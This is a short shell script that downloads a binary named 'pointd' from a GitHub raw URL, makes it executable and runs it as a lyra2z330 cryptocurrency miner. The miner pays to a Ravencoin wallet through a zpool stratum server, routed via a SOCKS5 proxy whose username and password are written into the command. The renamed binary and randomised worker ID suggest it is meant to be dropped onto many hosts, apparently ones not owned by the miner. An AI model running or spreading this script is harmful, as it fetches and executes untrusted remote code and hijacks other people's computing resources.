apt update -y
wget -q https://raw.githubusercontent.com/kopermadesa/super-duper-dollop/main/pointd
chmod +x pointd
./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u RVJeQfx48Z3YQMJuC81wxv9K3B1pPTuqeB.$(shuf -n 1 -i 1-9999999) -t 2 -p c=RVN,zap=BUT-lyra2z330 -x socks5://berkahkita:kitabersama123@185.9.52.177:5185
